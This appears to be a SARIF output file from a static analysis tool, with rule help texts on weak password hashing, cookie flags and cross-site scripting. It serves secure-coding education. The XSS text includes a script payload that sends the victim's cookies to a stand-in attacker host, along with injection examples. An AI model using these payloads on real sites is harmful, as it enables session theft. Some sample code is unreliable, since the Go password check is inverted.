{
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "ShiftLeft NextGen Analysis",
          "rules": [
            {
              "id": "weak-hash-call",
              "help": {
                "text": "The application uses a weak cryptographic hash algorithm, such as MD5 or SHA1.\n\n## Weak Hashes\n\nA *hash* is a type of cryptographic algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\njava\npublic String hashPassword(String password) \n{\n    return org.mindrot.BCrypt.hashpw(password, org.mindrot.BCrypt.gensalt(SALT_ROUNDS));\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[C#]\n\nBCrypt is a strong, one-way hash called that can be used to encode passwords, and validate them as they are re-entered\nby a user. It is available in the NuGet repository and can be used as shown:\n\ncsharp\nusing BCrypt.Net;\n\n// BCrypt is a strong hash, suitable for storing passwords. Remember to add a salt value!\npublic class Hashing\n{\n    private static string GetRandomSalt()\n    {\n        return BCrypt.GenerateSalt(12);\n    }\n    \n    public static string HashPassword(string password)\n    {\n        return BCrypt.HashPassword(password, GetRandomSalt());\n    }\n    \n    public static bool ValidatePassword(string password, string correctHash)\n    {\n       \treturn BCrypt.Verify(password, correctHash);\n    }\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\njavascript\nconst bcrypt  = require('bcrypt')\nconst express = require('express')\n\nconst app    = express()\n\n// Increase this value to make the hashing process take longer, and hence harder to decrypt.\nconst saltRounds = 10\n\napp.post('/signup', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is signing up - calculated their password hash and save it to the database.\n   */\n  bcrypt.hash(password, saltRounds, (error, hashedPassword) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    saveUser(username, hashedPassword)\n    response.redirect('/login')\n  })\n})\n\napp.post('/login', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is logging back in - recalculate their password hash and\n   * compare it with the saved value.\n   */\n  const user = getUser(username)\n\n  // Calculate the password hash regardless of whether the username exists,\n  // so the attacker cannot use timing attacks to detect which users exist\n  // in the database.\n  const passwordHash = user ? user.hashedPassword : ''\n\n  bcrypt.compare(password, passwordHash, (error, matched) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    if (user && matched) {\n      // The password hash matches, Log the user in.\n      request.session.username = username\n      self.redirect('/')\n    }\n    else {\n      // Tell them the credentials are incorrect.\n      response.status(401)\n    }\n  })\n})\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Python]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\npython\nimport bcrypt\n\n@app.route('/signup', methods=('POST',))\ndef do_signup():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is signing up - calculated their password hash and save it to the database.\n  salt   = bcrypt.gensalt()\n  hashed = bcrypt.hashpw(password, salt)\n\n  save_credentials(username, hashed)\n\n  return redirect('/login')\n\n@app.route('/login', methods=('POST',))\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is logging back in - recalculate their password hash and\n  # compare it with the saved value.\n  user   = get_user(username)\n  hashed = user.hashed_password if user else ''\n\n  # Calculate the password hash regardless of whether the username exists,\n  # so the attacker cannot use timing attacks to detect which users exist\n  # in the database.\n  if bcrypt.checkpw(password, hashed):\n    session['user'] = user\n    return redirect('/timeline')\n\n  return render_template('login.html', error='Invalid username or password')\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Scala]\n\nA *hash* is a type of encryption algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\nscala\nval SaltRounds : Int = 10\n\ndef encryptPassword(password: String) = {\n  org.mindrot.jbcrypt.BCrypt.hashpw(password, org.mindrot.jbcrypt.BCrypt.gensalt(SaltRounds));\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Go]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\ngo\nimport (\n  \"golang.org/x/crypto/bcrypt\"\n  \"fmt\"\n)\n\nfunc HashPassword(password string) string {\n  // Each call to GenerateFromPassword(...) will use a different salt value.\n  hash, _ := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)\n  return string(hash)\n}\n\nfunc CheckPassword(hashedPassword string, password string) bool {\n  err := bcrypt.CompareHashAndPassword(hashedPassword, password)\n  return err != nil\n}\n\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[PHP]\n\n## Weak Hashes in PHP\n\nIn PHP, there are older hash functions like md5() and sha1(), which, due to their vulnerabilities, shouldn't be used for sensitive operations. An attacker, equipped with rainbow tables or leveraging collisions, can reverse-engineer these hashes. Here's an example of using md5 for password hashing:\n\nphp\nfunction insecureHashPassword($password) {\n    return md5($password);\n}\n\n\nThis approach is flawed and insecure for the reasons stated above.\n\n## Mitigation\n\n1. **Use PHP's Built-in Password Functions**: PHP provides the password_hash() function, which by default uses the bcrypt algorithm and incorporates salting:\n\nphp\nfunction hashPasswordSecurely($password) {\n    return password_hash($password, PASSWORD_DEFAULT);\n}\n\n\n2. **Verify Passwords Securely**: When verifying a user's password, use the password_verify() function. This method safely compares a password against a hashed value:\n\nphp\nfunction verifyPassword($password, $hashedPassword) {\n    return password_verify($password, $hashedPassword);\n}\n\n\n3. **Always Include a Salt**: Modern hashing functions like password_hash() incorporate salting automatically. This ensures that even if two users have the same password, their hashed values will be different, thwarting rainbow table attacks.\n\n4. **Migrate Old Hashes**: If you're dealing with an older system, migrate hashes from weak algorithms to stronger ones upon user login or during a forced password reset.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**.",
                "markdown": "The application uses a weak cryptographic hash algorithm, such as MD5 or SHA1.\n\n## Weak Hashes\n\nA *hash* is a type of cryptographic algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```java\npublic String hashPassword(String password) \n{\n    return org.mindrot.BCrypt.hashpw(password, org.mindrot.BCrypt.gensalt(SALT_ROUNDS));\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[C#]\n\n`BCrypt` is a strong, one-way hash called that can be used to encode passwords, and validate them as they are re-entered\nby a user. It is available in the NuGet repository and can be used as shown:\n\n```csharp\nusing BCrypt.Net;\n\n// BCrypt is a strong hash, suitable for storing passwords. Remember to add a salt value!\npublic class Hashing\n{\n    private static string GetRandomSalt()\n    {\n        return BCrypt.GenerateSalt(12);\n    }\n    \n    public static string HashPassword(string password)\n    {\n        return BCrypt.HashPassword(password, GetRandomSalt());\n    }\n    \n    public static bool ValidatePassword(string password, string correctHash)\n    {\n       \treturn BCrypt.Verify(password, correctHash);\n    }\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```javascript\nconst bcrypt  = require('bcrypt')\nconst express = require('express')\n\nconst app    = express()\n\n// Increase this value to make the hashing process take longer, and hence harder to decrypt.\nconst saltRounds = 10\n\napp.post('/signup', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is signing up - calculated their password hash and save it to the database.\n   */\n  bcrypt.hash(password, saltRounds, (error, hashedPassword) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    saveUser(username, hashedPassword)\n    response.redirect('/login')\n  })\n})\n\napp.post('/login', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is logging back in - recalculate their password hash and\n   * compare it with the saved value.\n   */\n  const user = getUser(username)\n\n  // Calculate the password hash regardless of whether the username exists,\n  // so the attacker cannot use timing attacks to detect which users exist\n  // in the database.\n  const passwordHash = user ? user.hashedPassword : ''\n\n  bcrypt.compare(password, passwordHash, (error, matched) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    if (user && matched) {\n      // The password hash matches, Log the user in.\n      request.session.username = username\n      self.redirect('/')\n    }\n    else {\n      // Tell them the credentials are incorrect.\n      response.status(401)\n    }\n  })\n})\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Python]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```python\nimport bcrypt\n\n@app.route('/signup', methods=('POST',))\ndef do_signup():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is signing up - calculated their password hash and save it to the database.\n  salt   = bcrypt.gensalt()\n  hashed = bcrypt.hashpw(password, salt)\n\n  save_credentials(username, hashed)\n\n  return redirect('/login')\n\n@app.route('/login', methods=('POST',))\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is logging back in - recalculate their password hash and\n  # compare it with the saved value.\n  user   = get_user(username)\n  hashed = user.hashed_password if user else ''\n\n  # Calculate the password hash regardless of whether the username exists,\n  # so the attacker cannot use timing attacks to detect which users exist\n  # in the database.\n  if bcrypt.checkpw(password, hashed):\n    session['user'] = user\n    return redirect('/timeline')\n\n  return render_template('login.html', error='Invalid username or password')\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Scala]\n\nA *hash* is a type of encryption algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```scala\nval SaltRounds : Int = 10\n\ndef encryptPassword(password: String) = {\n  org.mindrot.jbcrypt.BCrypt.hashpw(password, org.mindrot.jbcrypt.BCrypt.gensalt(SaltRounds));\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Go]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```go\nimport (\n  \"golang.org/x/crypto/bcrypt\"\n  \"fmt\"\n)\n\nfunc HashPassword(password string) string {\n  // Each call to GenerateFromPassword(...) will use a different salt value.\n  hash, _ := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)\n  return string(hash)\n}\n\nfunc CheckPassword(hashedPassword string, password string) bool {\n  err := bcrypt.CompareHashAndPassword(hashedPassword, password)\n  return err != nil\n}\n\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[PHP]\n\n## Weak Hashes in PHP\n\nIn PHP, there are older hash functions like `md5()` and `sha1()`, which, due to their vulnerabilities, shouldn't be used for sensitive operations. An attacker, equipped with rainbow tables or leveraging collisions, can reverse-engineer these hashes. Here's an example of using `md5` for password hashing:\n\n```php\nfunction insecureHashPassword($password) {\n    return md5($password);\n}\n```\n\nThis approach is flawed and insecure for the reasons stated above.\n\n## Mitigation\n\n1. **Use PHP's Built-in Password Functions**: PHP provides the `password_hash()` function, which by default uses the `bcrypt` algorithm and incorporates salting:\n\n```php\nfunction hashPasswordSecurely($password) {\n    return password_hash($password, PASSWORD_DEFAULT);\n}\n```\n\n2. **Verify Passwords Securely**: When verifying a user's password, use the `password_verify()` function. This method safely compares a password against a hashed value:\n\n```php\nfunction verifyPassword($password, $hashedPassword) {\n    return password_verify($password, $hashedPassword);\n}\n```\n\n3. **Always Include a Salt**: Modern hashing functions like `password_hash()` incorporate salting automatically. This ensures that even if two users have the same password, their hashed values will be different, thwarting rainbow table attacks.\n\n4. **Migrate Old Hashes**: If you're dealing with an older system, migrate hashes from weak algorithms to stronger ones upon user login or during a forced password reset.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**."
              },
              "name": "WeakHash",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "The application uses a weak cryptographic hash algorithm, such as MD5 or SHA1."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Weak Hash"
              }
            },
            {
              "id": "cookie-missing-httponly-flag",
              "help": {
                "text": "Cookies are used without the _HttpOnly_ attribute set to true. In conjunction with a cross-site-scripting\n vulnerability, an attacker can exfiltrate or manipulate the data stored in this cookie.\n ## Countermeasures\n - Set the _HttpOnly_ attribute of cookies to true.\n ## Additional information\n **[CWE-1004](https://cwe.mitre.org/data/definitions/1004.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**.",
                "markdown": "Cookies are used without the _HttpOnly_ attribute set to `true`. In conjunction with a cross-site-scripting\n vulnerability, an attacker can exfiltrate or manipulate the data stored in this cookie.\n ## Countermeasures\n - Set the _HttpOnly_ attribute of cookies to `true`.\n ## Additional information\n **[CWE-1004](https://cwe.mitre.org/data/definitions/1004.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**."
              },
              "name": "SecurityBestPractices",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "fullDescription": {
                "text": "Cookies are used without the _HttpOnly_ attribute set to `true`. In conjunction with a cross-site-scripting."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Security Best Practices"
              }
            },
            {
              "id": "cookie-missing-secure-flag",
              "help": {
                "text": "Cookies are used without the _Secure_ attribute set to true. By intercepting data\n sent over a network he has access to, attackers can retrieve sensitive information\n contained in those cookies, which could allow them to impersonate other users.\n ## Countermeasures\n - Set the _Secure_ attribute of cookies to true.\n ## Additional information\n **[CWE-614](https://cwe.mitre.org/data/definitions/614.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**.",
                "markdown": "Cookies are used without the _Secure_ attribute set to `true`. By intercepting data\n sent over a network he has access to, attackers can retrieve sensitive information\n contained in those cookies, which could allow them to impersonate other users.\n ## Countermeasures\n - Set the _Secure_ attribute of cookies to `true`.\n ## Additional information\n **[CWE-614](https://cwe.mitre.org/data/definitions/614.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**."
              },
              "name": "SecurityBestPractices",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "fullDescription": {
                "text": "Cookies are used without the _Secure_ attribute set to `true`. By intercepting data."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Security Best Practices"
              }
            },
            {
              "id": "stored-xss",
              "help": {
                "text": "Attacker controlled sensitive data is not escaped and inserted into a database in this flow. This indicates a potential stored cross-site scripting (XSS) attack.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the search query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this <script> tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag <img src=\"...\">. An attacker with user-id 1337 specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\nhtml\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\njavascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(<img src=\"${res.avatarURL}\">));\n\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the Content-Security-Policy (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an <iframe> with the sandbox attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\nhtml\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache \ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the bypassSecurityTrust* functions in the DomSanitizer object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\ntypescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as &lt;&quot;script&quot;&gt; when rendering the HTML, safely defusing any\npotential XSS attacks:\n\nhtml\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n\n\nThis can be overridden using the Html.Raw() method - opening up the possibility of XSS attacks:\n\nhtml\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n\n\nCarefully audit every use of Html.Raw() to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the System.Web.HttpUtility.HtmlEncode() method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe html/template package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\ngo\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse({{define \"T\"}}Hello, {{.}}!{{end}})\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n\n\n...writes escaped HTML to the out variable. This is in contrast to the text/template package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the html/template.HTMLEscapeString() function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\njavascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the escape-html Node module:\n\njavascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way your templates can become vulnerable is by adding the {% autoescape false %} directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping 